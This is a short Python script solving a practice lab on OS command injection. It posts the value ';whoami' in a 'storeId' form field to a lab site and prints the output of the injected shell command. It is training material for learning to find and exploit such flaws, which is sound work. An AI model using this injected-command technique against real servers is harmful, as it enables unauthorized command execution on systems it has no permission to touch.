########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 10/10/2023
#
# Lab: OS command injection, simple case
#
# Steps: 1. Inject payload into "storeId" parameter to execute the `whoami` command
#        2. Observe the `whoami` output in the response
#
########################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a3c007b0327555683381b91001b0078.web-security-academy.net" 

# the payload to execute the `whoami` command
payload = ";whoami"

# data to send via POST
data = {
    "productId": "2",
    "storeId": payload
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{url}/product/stock", data)
    
except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

# the response contains the output of the `whoami` command
whoami = injection.text

print(Fore.WHITE + "❯ Injection point: " + Fore.YELLOW + "storeId")

# if response is OK
if injection.status_code == 200:
    print(Fore.WHITE + "❯ Injecting payload to execute the `whoami` command.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + whoami, end="", flush=True)
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload")

